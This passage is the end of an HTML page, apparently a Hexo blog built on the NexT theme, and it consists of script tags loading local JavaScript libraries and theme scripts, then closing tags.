    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
